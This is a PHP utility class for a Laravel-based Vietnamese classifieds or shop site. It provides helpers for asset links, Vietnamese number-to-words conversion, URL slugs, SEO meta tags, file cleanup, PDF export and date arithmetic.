<?php
/**
 * Created by PhpStorm.
 * User: MT969
 * Date: 6/5/2015
 * Time: 5:01 PM
 */

namespace App\Library\AdminFunction;

use Carbon\Carbon;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Session;
use App\Library\AdminFunction\Define;
use App\Library\AdminFunction\CGlobal;
use Illuminate\Support\Facades\URL;


class FunctionLib
{

    static function bug($data, $die = true)
    {
        echo "<pre>";
        print_r($data);
        echo "</pre>";
        if ($die) {
            die;
        }
    }

    static function buildParams($pices = '&', $data)
    {
        $result = "";
        if (!empty($data)) {
            foreach ($data as $k => $v) {
                $result .= $k . '=' . urlencode($v) . $pices;
            }
        }
        if ($result != '') {
            $result = substr($result, 0, -1);
        }
        return $result;
    }

    static function getDirRoot()
    {
        $webroot = str_replace('\\', '/', 'http://' . $_SERVER['HTTP_HOST'] . (dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
        $webroot .= $webroot[strlen($webroot) - 1] != '/' ? '/' : '';
        $strWebroot = $webroot;
        return $strWebroot;
    }
    //Get root path
    public function getRootPath(){
        $dir_root = str_replace('\\','/',$_SERVER['DOCUMENT_ROOT'] . (dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
        $dir_root .= $dir_root[strlen($dir_root)-1] != '/' ? '/' : '';
        return $dir_root;
    }
    /**
     * @param $file_name
     */
    static function link_css($file_name, $position = 1)
    {
        if (is_array($file_name)) {
            foreach ($file_name as $v) {
                self::link_css($v);
            }
            return;
        }
        if (strpos($file_name, 'http://') !== false) {
            $html = '<link rel="stylesheet" href="' . $file_name . ((CGlobal::$css_ver) ? '?ver=' . CGlobal::$css_ver : '') . '" type="text/css">' . "\n";
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderCSS, $html) === false)
                CGlobal::$extraHeaderCSS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterCSS, $html) === false)
                CGlobal::$extraFooterCSS .= $html . "\n";
            return;
        } else {
            $html = '<link type="text/css" rel="stylesheet" href="' . self::getDirRoot() . 'assets/' . $file_name . ((CGlobal::$css_ver) ? '?ver=' . CGlobal::$css_ver : '') . '" />' . "\n";
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderCSS, $html) === false)
                CGlobal::$extraHeaderCSS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterCSS, $html) === false)
                CGlobal::$extraFooterCSS .= $html . "\n";
        }
    }

    /**
     * @param $file_name
     */
    static function link_js($file_name, $position = 1)
    {
        if (is_array($file_name)) {
            foreach ($file_name as $v) {
                self::link_js($v);
            }
            return;
        }
        if (strpos($file_name, 'http://') !== false) {
            $html = '<script type="text/javascript" src="' . $file_name . ((CGlobal::$js_ver) ? '?ver=' . CGlobal::$js_ver : '') . '"></script>';
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderJS, $html) === false)
                CGlobal::$extraHeaderJS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterJS, $html) === false)
                CGlobal::$extraFooterJS .= $html . "\n";
            return;
        } else {
            $html = '<script type="text/javascript" src="' . self::getDirRoot() . 'assets/' . $file_name . ((CGlobal::$js_ver) ? '?ver=' . CGlobal::$js_ver : '') . '"></script>';
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderJS, $html) === false)
                CGlobal::$extraHeaderJS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterJS, $html) === false)
                CGlobal::$extraFooterJS .= $html . "\n";
        }
    }

    static function site_css($file_name, $position = 1)
    {
        if (is_array($file_name)) {
            foreach ($file_name as $v) {
                self::site_css($v);
            }
            return;
        }
        if (strpos($file_name, 'http://') !== false) {
            $html = '<link rel="stylesheet" href="' . $file_name . ((CGlobal::$css_ver) ? '?ver=' . CGlobal::$css_ver : '') . '" type="text/css">' . "\n";
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderCSS, $html) === false)
                CGlobal::$extraHeaderCSS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterCSS, $html) === false)
                CGlobal::$extraFooterCSS .= $html . "\n";
            return;
        } else {
            $html = '<link type="text/css" rel="stylesheet" href="' . url('', array(), Config::get('config.SECURE')) . '/assets/' . $file_name . ((CGlobal::$css_ver) ? '?ver=' . CGlobal::$css_ver : '') . '" />' . "\n";
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderCSS, $html) === false)
                CGlobal::$extraHeaderCSS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterCSS, $html) === false)
                CGlobal::$extraFooterCSS .= $html . "\n";
        }
    }

    /**
     * @param $file_name
     */
    static function site_js($file_name, $position = 1)
    {
        if (is_array($file_name)) {
            foreach ($file_name as $v) {
                self::link_js($v);
            }
            return;
        }
        if (strpos($file_name, 'http://') !== false) {
            $html = '<script type="text/javascript" src="' . $file_name . ((CGlobal::$js_ver) ? '?ver=' . CGlobal::$js_ver : '') . '"></script>';
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderJS, $html) === false)
                CGlobal::$extraHeaderJS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterJS, $html) === false)
                CGlobal::$extraFooterJS .= $html . "\n";
            return;
        } else {
            $html = '<script type="text/javascript" src="' . url('', array(), Config::get('config.SECURE')) . '/assets/' . $file_name . ((CGlobal::$js_ver) ? '?ver=' . CGlobal::$js_ver : '') . '"></script>';
            if ($position == CGlobal::$POS_HEAD && strpos(CGlobal::$extraHeaderJS, $html) === false)
                CGlobal::$extraHeaderJS .= $html . "\n";
            elseif ($position == CGlobal::$POS_END && strpos(CGlobal::$extraFooterJS, $html) === false)
                CGlobal::$extraFooterJS .= $html . "\n";
        }
    }

    public static $array_allow_image = array(
        'jpg',
        'png',
        'jpeg'
    );

    public static $size_image_max = 1048576;

    public static function numberToWord($s, $lang = 'vi')
    {
        $ds = 0;
        $so = $hang = array();

        $viN = array("không", "một", "hai", "ba", "bốn", "năm", "sáu", "bảy", "tám", "chín");
        $viRow = array("", "nghìn", "triệu", "tỷ");

        $enN = array("zero", "one", "two", "three", "four", "five", "six", "seven", "eight", "nine");
        $enRow = array("", "thousand", "million", "billion");

        if ($lang == 'vi') {
            $so = $viN;
            $hang = $viRow;
        } else {
            $so = $enN;
            $hang = $enRow;
        }

        $s = str_replace(",", "", $s);
        $ds = (int)$s;
        if ($ds == 0) {
            return "không ";
        }

        $i = $j = $donvi = $chuc = $tram = 0;
        $i = strlen($s);

        $Str = "";
        if ($i == 0)
            $Str = "";
        else {
            $j = 0;
            while ($i > 0) {
                $donvi = substr($s, $i - 1, 1);
                $i = $i - 1;
                if ($i > 0) {
                    $chuc = substr($s, $i - 1, 1);
                } else {
                    $chuc = -1;
                }
                $i = $i - 1;
                if ($i > 0) {
                    $tram = substr($s, $i - 1, 1);
                } else {
                    $tram = -1;
                }
                $i = $i - 1;
                if ($donvi > 0 || $chuc > 0 || $tram > 0 || $j == 3)
                    $Str = $hang[$j] . " " . $Str;
                $j = $j + 1;
                if ($j > 3)
                    $j = 1;
                if ($donvi == 1 && $chuc > 1)
                    $Str = "mốt" . " " . $Str;
                else {
                    if ($donvi == 5 && $chuc > 0)
                        $Str = "lăm" . " " . $Str;
                    else if ($donvi > 0)
                        $Str = $so[$donvi] . " " . $Str;
                }
                if ($chuc < 0)
                    break;
                else
                    if ($chuc == 0 && $donvi > 0)
                        $Str = "lẻ" . " " . $Str;
                if ($chuc == 1)
                    $Str = "mười" . " " . $Str;
                if ($chuc > 1)
                    $Str = $so[$chuc] . " " . "mươi" . " " . $Str;
                if ($tram < 0)
                    break;
                else
                    if ($tram > 0 || $chuc > 0 || $donvi > 0)
                        $Str = $so[$tram] . " " . "trăm" . " " . $Str;
            }
        }
        return strtoupper(substr($Str, 0, 1)) . substr($Str, 1, strlen($Str) - 1) . ($lang == 'vi' ? "đồng" : 'vnd');
    }

    static function getDateTime($time = '')
    {
        $time = (trim($time) != '') ? strtotime($time) : time();
        return date('Y-m-d h:i:s', $time);
    }

    static function getIntDate($time = '')
    {
        $time = (trim($time) != '') ? strtotime($time) : time();
        return date('Ymd', $time);
    }

    static function debugOnsite($array)
    {
        if (Request::get('quynhtm') == 133) {
            FunctionLib::debug($array);
        }
    }

    /**
     * build html select option
     *
     * @param array $options_array
     * @param int $selected
     * @param array $disabled
     */
    static function getOption($options_array, $selected, $disabled = array())
    {
        $input = '';
        if ($options_array)
            foreach ($options_array as $key => $text) {
                $input .= '<option value="' . $key . '"';
                if (!in_array($selected, $disabled)) {
                    if ($key === '' && $selected === '') {
                        $input .= ' selected';
                    } else
                        if ($selected !== '' && $key == $selected) {
                            $input .= ' selected';
                        }
                }
                if (!empty($disabled)) {
                    if (in_array($key, $disabled)) {
                        $input .= ' disabled';
                    }
                }
                $input .= '>' . $text . '</option>';
            }
        return $input;
    }

    /**
     * build html select option mutil
     *
     * @param array $options_array
     * @param array $arrSelected
     */
    static function getOptionMultil($options_array, $arrSelected)
    {
        $input = '';
        if ($options_array)
            foreach ($options_array as $key => $text) {
                $input .= '<option value="' . $key . '"';
                if ($key === '' && empty($arrSelected)) {
                    $input .= ' selected';
                } else
                    if (!empty($arrSelected) && in_array($key, $arrSelected)) {
                        $input .= ' selected';
                    }
                $input .= '>' . $text . '</option>';
            }
        return $input;
    }


    public static function sortArrayASC(&$array, $key)
    {
        $sorter = array();
        $ret = array();
        reset($array);
        foreach ($array as $ii => $va) {
            $sorter[$ii] = $va[$key];
        }
        asort($sorter);
        foreach ($sorter as $ii => $va) {
            $ret[$ii] = $array[$ii];
        }
        $array = $ret;
    }

    static function safe_title($text, $kytu = '-')
    {
        $text = FunctionLib::post_db_parse_html($text);
        $text = FunctionLib::stripUnicode($text);
        $text = self::_name_cleaner($text, $kytu);
        $text = str_replace("----", $kytu, $text);
        $text = str_replace("---", $kytu, $text);
        $text = str_replace("--", $kytu, $text);
        $text = trim($text, $kytu);

        if ($text) {
            return $text;
        } else {
            return "shop";
        }
    }

    //cackysapxepgannhau
    static function stringtitle($text)
    {
        $text = FunctionLib::post_db_parse_html($text);
        $text = FunctionLib::stripUnicode($text);
        $text = self::_name_cleaner($text, "-");
        $text = str_replace("----", "-", $text);
        $text = str_replace("---", "-", $text);
        $text = str_replace("--", "-", $text);
        $text = str_replace("-", "", $text);
        $text = trim($text);

        if ($text) {
            return $text;
        } else {
            return "shop";
        }
    }


    static function post_db_parse_html($t = "")
    {
        if ($t == "") {
            return $t;
        }

        $t = str_replace("&#39;", "'", $t);
        $t = str_replace("&#33;", "!", $t);
        $t = str_replace("&#036;", "$", $t);
        $t = str_replace("&#124;", "|", $t);
        $t = str_replace("&amp;", "&", $t);
        $t = str_replace("&gt;", ">", $t);
        $t = str_replace("&lt;", "<", $t);
        $t = str_replace("&quot;", '"', $t);

        $t = preg_replace("/javascript/i", "j&#097;v&#097;script", $t);
        $t = preg_replace("/alert/i", "&#097;lert", $t);
        $t = preg_replace("/about:/i", "&#097;bout:", $t);
        $t = preg_replace("/onmouseover/i", "&#111;nmouseover", $t);
        $t = preg_replace("/onmouseout/i", "&#111;nmouseout", $t);
        $t = preg_replace("/onclick/i", "&#111;nclick", $t);
        $t = preg_replace("/onload/i", "&#111;nload", $t);
        $t = preg_replace("/onsubmit/i", "&#111;nsubmit", $t);
        $t = preg_replace("/applet/i", "&#097;pplet", $t);
        $t = preg_replace("/meta/i", "met&#097;", $t);

        return $t;
    }

    static function stripUnicode($str)
    {
        if (!$str)
            return false;
        $marTViet = array("à", "á", "ạ", "ả", "ã", "â", "ầ", "ấ", "ậ", "ẩ", "ẫ", "ă",
            "ằ", "ắ", "ặ", "ẳ", "ẵ", "è", "é", "ẹ", "ẻ", "ẽ", "ê", "ề"
        , "ế", "ệ", "ể", "ễ",
            "ì", "í", "ị", "ỉ", "ĩ",
            "ò", "ó", "ọ", "ỏ", "õ", "ô", "ồ", "ố", "ộ", "ổ", "ỗ", "ơ"
        , "ờ", "ớ", "ợ", "ở", "ỡ",
            "ù", "ú", "ụ", "ủ", "ũ", "ư", "ừ", "ứ", "ự", "ử", "ữ",
            "ỳ", "ý", "ỵ", "ỷ", "ỹ",
            "đ",
            "À", "Á", "Ạ", "Ả", "Ã", "Â", "Ầ", "Ấ", "Ậ", "Ẩ", "Ẫ", "Ă"
        , "Ằ", "Ắ", "Ặ", "Ẳ", "Ẵ",
            "È", "É", "Ẹ", "Ẻ", "Ẽ", "Ê", "Ề", "Ế", "Ệ", "Ể", "Ễ",
            "Ì", "Í", "Ị", "Ỉ", "Ĩ",
            "Ò", "Ó", "Ọ", "Ỏ", "Õ", "Ô", "Ồ", "Ố", "Ộ", "Ổ", "Ỗ", "Ơ"
        , "Ờ", "Ớ", "Ợ", "Ở", "Ỡ",
            "Ù", "Ú", "Ụ", "Ủ", "Ũ", "Ư", "Ừ", "Ứ", "Ự", "Ử", "Ữ",
            "Ỳ", "Ý", "Ỵ", "Ỷ", "Ỹ",
            "Đ");

        $marKoDau = array("a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a"
        , "a", "a", "a", "a", "a", "a",
            "e", "e", "e", "e", "e", "e", "e", "e", "e", "e", "e",
            "i", "i", "i", "i", "i",
            "o", "o", "o", "o", "o", "o", "o", "o", "o", "o", "o", "o"
        , "o", "o", "o", "o", "o",
            "u", "u", "u", "u", "u", "u", "u", "u", "u", "u", "u",
            "y", "y", "y", "y", "y",
            "d",
            "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A", "A"
        , "A", "A", "A", "A", "A",
            "E", "E", "E", "E", "E", "E", "E", "E", "E", "E", "E",
            "I", "I", "I", "I", "I",
            "O", "O", "O", "O", "O", "O", "O", "O", "O", "O", "O", "O"
        , "O", "O", "O", "O", "O",
            "U", "U", "U", "U", "U", "U", "U", "U", "U", "U", "U",
            "Y", "Y", "Y", "Y", "Y",
            "D");

        $str = str_replace($marTViet, $marKoDau, $str);
        return $str;
    }

    static function _name_cleaner($name, $replace_string = "_")
    {
        return preg_replace("/[^a-zA-Z0-9\-\_]/", $replace_string, $name);
    }

    /**
     * convert from str to array
     *
     * @param string $str_item
     */
    static function standardizeCartStr($str_item)
    {
        if (empty($str_item))
            return 0;
        $str_item = trim(preg_replace('#([\s]+)|(,+)#', ',', trim($str_item)));
        $data = explode(',', $str_item);
        $arrItem = array();
        foreach ($data as $item) {
            if ($item != '')
                $arrItem[] = $item;
        }
        if (empty($arrItem))
            return 0;
        else
            return $arrItem;
    }

    static function numberFormat($number = 0)
    {
        if ($number >= 1000) {
            return number_format($number, 0, ',', '.');
        }
        return $number;
    }

    public static function checkRegexEmail($str = '')
    {
        if ($str != '') {
            $regex = '/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/';
            if (!preg_match($regex, $str)) {
                return false;
            }
            return true;
        }
        return false;
    }

    static function substring($str, $length = 100, $replacer = '...')
    {
        $str = strip_tags($str);
        if (strlen($str) <= $length) {
            return $str;
        }
        $str = trim(@substr($str, 0, $length));
        $posSpace = strrpos($str, ' ');
        $replacer = "...";
        return substr($str, 0, $posSpace) . $replacer;
    }

    //Buid Link Category
    static function buildLinkCategory($cat_id = 0, $cat_title = 'Danh-mục', $province_id = 0, $province_name = '')
    {
        $link_view = '#';
        if ($cat_id > 0) {
            $link_view = URL::route('Site.pageCategory', array('id' => $cat_id, 'name' => strtolower(FunctionLib::safe_title($cat_title))));
            if ($province_id > 0 && $province_name != '') {
                $link_view .= '?city_id=' . $province_id . '&tinh=' . $province_name;
            }
        }
        return $link_view;
    }

    //Buid Link danh sach tin dang cua nguoi dung
    static function buildLinkItemsCustomer($customer_id = 0, $customer_name = 'Khách hàng')
    {
        if ($customer_id > 0) {
            return URL::route('Site.pageListItemCustomer', array('customer_name' => strtolower(FunctionLib::safe_title($customer_name)), 'customer_id' => $customer_id));
        }
        return '#';
    }

    /**
     * @param int $pro_id
     * @param string $pro_name
     * @param string $cat_name
     * @return string
     */
    static function buildLinkDetailItem($item_id = 0, $item_name = 'tin đăng', $cat_id = 0)
    {
        if ($item_id > 0) {
            return URL::route('Site.pageDetailItem', array('item_id' => $item_id, 'item_name' => strtolower(FunctionLib::safe_title($item_name)), 'item_category_id' => $cat_id));
        }
        return '#';
    }

    /**
     * @param int $new_id
     * @param string $new_name
     * @param string $cat_name
     * @return string
     */
    static function buildLinkCateNews($cat_id = 0, $cat_name_alias = 'tin tức')
    {
        if ($cat_id > 0) {
            return URL::route('Site.pageCatNews', array('cat_name_alias' => strtolower(FunctionLib::safe_title($cat_name_alias)), 'cat_id' => $cat_id));
        }
        return '#';
    }

    static function buildLinkDetailNews($new_id = 0, $news_title = 'tin tức')
    {
        if ($new_id > 0) {
            return URL::route('Site.pageDetailNew', array('news_title' => strtolower(FunctionLib::safe_title($news_title)), 'new_id' => $new_id));
        }
        return '#';
    }

    /**
     * @param string $file_name
     * @param int $id
     * @param string $folder
     * @param bool|true $is_delDir
     */
    static function deleteFileUpload($file_name = '', $id = 0, $folder = FOLDER_PRODUCT, $is_delDir = true)
    {
        if ($file_name != '') {
            if ($id > 0) {
                $path = ($folder != '') ? Config::get('config.DIR_ROOT') . Config::get('config.DIR_UPLOAD') . $folder . '/' . $id : '';
            } else {
                $path = ($folder != '') ? Config::get('config.DIR_ROOT') . Config::get('config.DIR_UPLOAD') . $folder : '';
            }
            if ($file_name != '') {
                if ($path != '') {
                    if (is_file($path . '/' . $file_name)) {
                        @unlink($path . '/' . $file_name);
                    }
                }
            }
            //Xoa thu muc
            if ($is_delDir) {
                if ($path != '') {
                    if (is_dir($path)) {
                        @rmdir($path);
                    }
                }
            }
        }
    }

    /**
     * @param string $file_name
     * @param int $id
     * @param string $folder
     * @param string $folderSize
     * @param bool|true $is_delDir
     */
    static function deleteFileThumb($file_name = '', $folder = CGlobal::FOLDER_PRODUCT, $folderSize = '100x100', $is_delDir = true, $id = 0)
    {
        if ($file_name != '') {
            if ($id > 0) {
                $dirRootItem = Config::get('config.DIR_ROOT') . '/uploads/thumbs/' . $folder . '/' . $id;
            } else {
                $dirRootItem = Config::get('config.DIR_ROOT') . '/uploads/thumbs/' . $folder;
            }
            $dirImgThumb = $dirRootItem . '/' . $folderSize;
            if ($file_name != '') {
                if ($dirImgThumb != '') {
                    if (is_file($dirImgThumb . '/' . $file_name)) {
                        @unlink($dirImgThumb . '/' . $file_name);
                    }
                }
            }
            if ($is_delDir) {
                //xoa thu muc theo size
                if ($dirImgThumb != '') {
                    if (is_dir($dirImgThumb)) {
                        @rmdir($dirImgThumb);
                    }
                }
                //xoa thu muc theo ID
                if ($dirRootItem != '') {
                    if (is_dir($dirRootItem)) {
                        @rmdir($dirRootItem);
                    }
                }
            }
        }
    }

    /**
     * @param int $banner_type
     * @param int $banner_page
     * @param int $banner_category_id
     * @param int $banner_shop_id
     * @return array
     */
    static function getBannerAdvanced($banner_type = 0, $banner_page = 0, $banner_category_id = 0, $banner_shop_id = 0)
    {
        $result = array();
        $arrBanner = Banner::getBannerAdvanced($banner_type, $banner_page, $banner_category_id, $banner_shop_id);
        if ($arrBanner && sizeof($arrBanner) > 0) {
            foreach ($arrBanner as $banner) {
                //banner chạy thời gian
                if ($banner->banner_is_run_time == CGlobal::BANNER_IS_RUN_TIME) {
                    $today = time();
                    if ($banner->banner_start_time < $today && $banner->banner_end_time > $today) {
                        $result[] = $banner;
                    }
                } //banner của shop dang hoat dong
                elseif ($banner->banner_is_shop == CGlobal::BANNER_IS_SHOP && $banner->banner_shop_id > 0) {
                    $arrShopShow = UserShop::getShopAll();
                    if (in_array($banner->banner_shop_id, array_keys($arrShopShow))) {
                        $result[] = $banner;
                    }
                } else {
                    $result[] = $banner;
                }
            }
        }
        return $result;
    }

    static function sortBySubValue($array, $value, $asc = true, $preserveKeys = false)
    {
        if (!empty($array)) {
            if ($preserveKeys) {
                $c = array();
                if (is_object(reset($array))) {
                    foreach ($array as $k => $v) {
                        $b[$k] = strtolower($v->$value);
                    }
                } else {
                    foreach ($array as $k => $v) {
                        $b[$k] = strtolower($v[$value]);
                    }
                }
                $asc ? asort($b) : arsort($b);
                foreach ($b as $k => $v) {
                    $c[$k] = $array[$k];
                }
                $array = $c;
            } else {
                if (is_object(reset($array))) {
                    usort($array, function ($a, $b) use ($value, $asc) {
                        return $a->{$value} == $b->{$value} ? 0 : ($a->{$value} - $b->{$value}) * ($asc ? 1 : -1);
                    });
                } else {
                    usort($array, function ($a, $b) use ($value, $asc) {
                        return $a[$value] == $b[$value] ? 0 : ($a[$value] - $b[$value]) * ($asc ? 1 : -1);
                    });
                }
            }
        }
        return $array;
    }

    //Get OS
    public static function getOS()
    {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $os_platform = "Unknown OS Platform";
        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile',
            '/windows phone os/i' => 'WindowsPhone',
        );

        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }
        }

        return $os_platform;
    }

    public static function checkOS()
    {
        $screenWidth = FunctionLib::getOS();
        if ($screenWidth == 'iphone' || $screenWidth == 'ipod' || $screenWidth == 'ipad' || $screenWidth == 'Android'
            || $screenWidth == 'Blackberry' || $screenWidth == 'Webos' || $screenWidth == 'WindowsPhone'
        ) {
            return 1;
        } else {
            return 0;
        }
    }

    public static function randomString($length = 5)
    {
        $str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $strLength = strlen($str);
        $random_string = '';
        for ($i = 0; $i <= $length; $i++) {
            $random_string .= $str[rand(0, $strLength - 1)];
        }
        return $random_string;
    }

    public static function SEO($img = '', $meta_title = '', $meta_keywords = '', $meta_description = '', $url = '')
    {
        if ($img == '') {
            $img = self::getDirRoot() . 'uploads/default.jpg';
        }
        if ($meta_title == '') {
            $meta_title = CGlobal::web_name;
        }
        if ($meta_keywords == '') {
            $meta_keywords = CGlobal::web_keywords;
        }
        if ($meta_description == '') {
            $meta_description = CGlobal::web_description;
        }

        $str = '';
        $str .= '<title>' . $meta_title . '</title>';
        $str .= "\n" . '<meta name="robots" content="index,follow">';
        $str .= "\n" . '<meta http-equiv="REFRESH" content="1800">';
        $str .= "\n" . '<meta name="revisit-after" content="days">';
        $str .= "\n" . '<meta http-equiv="content-language" content="vi"/>';
        $str .= "\n" . '<meta name="copyright" content="' . CGlobal::web_name . '">';
        $str .= "\n" . '<meta name="author" content="' . CGlobal::web_name . '">';

        //Google
        $str .= "\n" . '<meta name="keywords" content="' . $meta_keywords . '">';
        $str .= "\n" . '<meta name="description" content="' . $meta_description . '">';

        //Facebook
        $str .= "\n" . '<meta property="og:type" content="article" >';
        $str .= "\n" . '<meta property="og:title" content="' . $meta_title . '" >';
        $str .= "\n" . '<meta property="og:description" content="' . $meta_description . '" >';
        $str .= "\n" . '<meta property="og:site_name" content="' . CGlobal::web_name . '" >';
        $str .= "\n" . '<meta itemprop="thumbnailUrl" property="og:image" content="' . $img . '" >';

        //Twitter
        $str .= "\n" . '<meta name="twitter:title" content="' . $meta_title . '">';
        $str .= "\n" . '<meta name="twitter:description" content="' . $meta_description . '">';
        $str .= "\n" . '<meta name="twitter:image" content="' . $img . '">';

        if ($url != '') {
            $str .= "\n" . '<link rel="canonical" href="' . $url . '">';
            $str .= "\n" . '<meta property="og:url" itemprop="url" content="' . $url . '">';
            $str .= "\n" . '<meta name="twitter:url" content="' . $url . '">';
        }
        CGlobal::$extraMeta = $str;
    }

    //Set nofollow tag a
    public static function setNofollow($str)
    {
        return preg_replace('/(<a.*?)(rel=[\"|\'].*?[\"|\'])?(.*?\/a>)/i', '$1 rel="nofollow" $3', $str);
    }

    //Set messages
    public static function messages($alert, $messages = '', $type = 'success')
    {
        $str = '';
        if (Session::has($alert)) {
            $str = Session::get($alert);
        }
        //refreshed
        $refreshed = isset($_SERVER['HTTP_CACHE_CONTROL']) && $_SERVER['HTTP_CACHE_CONTROL'] === 'max-age=0';
        if ($refreshed) {
            if (Session::has($alert)) {
                Session::forget($alert);
            }
        } else {
            if ($messages != '') {
                if ($type == 'success') {
                    $messages = '<div class="alert alert-success">' . $messages . '</div>';
                } elseif ($type == 'error') {
                    $messages = '<div class="alert alert-danger">' . $messages . '</div>';
                }
            }
            Session::put($alert, $messages);
        }
        return $str;
    }

    public static function alertMessage($messages, $type = 'success')
    {
        $alert = '';
        $style = ($type == 'success') ? 'alert alert-success' : 'alert alert-danger';
        if (is_array($messages)) {
            $mess = '';
            foreach ($messages as $k => $msg) {
                $mess .= $msg . '<br/>';
            }
            $alert = '<div class="' . $style . '">' . $mess . '</div>';
        } elseif ($messages != '') {
            $alert = '<div class="' . $style . '">' . $messages . '</div>';
        }
        return $alert;
    }

    /**
     * Ham xuat PDF hay word
     * @param $html
     * @param $filename
     * @param string $outputType
     * @param bool|false $signature
     */
    public static function pdfOutput($html, $filename, $outputType = 'I', $signature = false)
    {
        $pdf = new MYPDF(PDF_PAGE_ORIENTATION, 'px', PDF_PAGE_FORMAT, true, 'UTF-8', false, false, $signature);

        // set document information
        $pdf->SetCreator('VCCorp System');
        $pdf->SetAuthor('VCCorp');
        $pdf->SetTitle('');
        $pdf->SetSubject('');
        $pdf->SetKeywords('VCCorp, contract');
        $pdf->setPrintFooter(false);

        // set default monospaced font
        $pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);

        $pdf->setFontSubsetting(false);

        //set margins
        // $pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);
        $pdf->SetMargins(30, 15, 30);
        $pdf->SetHeaderMargin(0);
        $pdf->SetFooterMargin(0);

        $pdf->SetCellPaddings(0);

        //set auto page breaks
        $pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);
        $pdf->setFormDefaultProp(array('lineWidth' => 0, 'borderStyle' => 'solid', 'fillColor' => array(255, 255, 255), 'strokeColor' => array(255, 255, 255)));

        // set font
        $pdf->SetFont('freeserif', '', 10);

        // add a page
        $pdf->AddPage();
        $pdf->writeHTML($html, true, false, true, false, '');

        // reset pointer to the last page
        $pdf->lastPage();

        //Close and output PDF document
        $pdf->Output($filename, $outputType);
    }

    /**
     * QuynhTM
     * @param $p_strngay1
     * @param $p_strngay2
     * @param string $p_strkieu
     * @return int|number
     */
    public static function khoangcachngay($p_strngay1, $p_strngay2, $p_strkieu = 'ngay')
    {
        $m_arrngay1 = explode('/', $p_strngay1);
        $m_arrngay2 = explode('/', $p_strngay2);
        $m_intngay1 = mktime(0, 0, 0, $m_arrngay1[1], $m_arrngay1[0], $m_arrngay1[2]);
        $m_intngay2 = mktime(0, 0, 0, $m_arrngay2[1], $m_arrngay2[0], $m_arrngay2[2]);

        $m_int = abs($m_intngay1 - $m_intngay2);
        switch ($p_strkieu) {
            case 'ngay':
                $m_int /= 86400;
                break;
            case 'gio' :
                $m_int /= 3600;
                break;
            case 'phut':
                $m_int /= 60;
                break;
            default :
                break;
        }
        return $m_int;
    }

    public static function khoangcachngay2($p_strngay1, $p_strngay2)
    {
        $end = Carbon::parse($p_strngay1);
        $now = $p_strngay2;
        $length = $end->diffInDays($now);
        return $length;
    }

    /**
     * QuynhTM
     * @param int $start_Time
     * @param int $end_Time
     * @param int $numberDateCheck
     * @param bool|false $is_root
     * @param bool|false $default
     */
    public static function setDateDefaultSearch(&$start_Time = 0, &$end_Time = 0, $numberDateCheck = 7, $is_root = false, $default = false)
    {
        $oneDay = 24 * 60 * 60;
        if ($is_root) return; // quyền root thi không check giới hạn ngày
        if ($start_Time != 0 && $end_Time != 0) {
            $so_ngay = FunctionLib::khoangcachngay(date('d/m/Y', $start_Time), date('d/m/Y', $end_Time));
            if ($so_ngay > $numberDateCheck) {
                $start_Time = $end_Time - $numberDateCheck * $oneDay;
            }
        } else {
            if ($end_Time != '') {
                $start_Time = $end_Time - $numberDateCheck * $oneDay;
            } elseif ($start_Time != 0) {
                $end_Time = $start_Time + $numberDateCheck * $oneDay;
            } elseif ($default) {
                $start_Time = time() - $numberDateCheck * $oneDay;
                $end_Time = time();
            }
        }
    }

    public static function strReplace($text = '', $strInput = '', $strReplace = '')
    {
        if ($text != '' && $strInput != '') {
            $text = str_replace($strInput, $strReplace, $text);
        }
        return $text;
    }

    /**
     * QuynhTM add
     * @param $id
     * @return string
     */
    public static function inputId($id)
    {
        return base64_encode(self::randomString() . '_' . $id . '_' . self::randomString());
    }

